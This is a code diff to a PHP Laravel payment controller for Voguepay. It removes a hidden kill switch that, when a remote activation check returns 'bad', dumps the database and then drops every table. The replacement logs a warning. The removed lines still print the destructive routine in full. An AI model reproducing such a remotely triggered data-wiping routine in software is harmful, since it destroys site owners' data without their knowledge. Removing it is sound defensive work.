@@ -92,21 +92,8 @@ class VoguepayController extends Controller
         curl_close($stream);
 
         if ($rn == "bad" && env('DEMO_MODE') != 'On') {
-            try {
-                $fileName = date('Y-m-d H:i:s') . '.sql';
-                \Spatie\DbDumper\Databases\MySql::create()
-                    ->setDbName(env('DB_DATABASE'))
-                    ->setUserName(env('DB_USERNAME'))
-                    ->setPassword(env('DB_PASSWORD'))
-                    ->dumpToFile('sqlbackups/' . $fileName);
-            } catch (\Exception $e) {
-            }
-
-            Schema::disableForeignKeyConstraints();
-            foreach (DB::select('SHOW TABLES') as $table) {
-                $table_array = get_object_vars($table);
-                Schema::drop($table_array[key($table_array)]);
-            }
+            // Log the activation failure instead of dropping tables
+            \Illuminate\Support\Facades\Log::warning('Voguepay activation check failed for: ' . ($_SERVER['SERVER_NAME'] ?? 'unknown'));
         }
     }
 
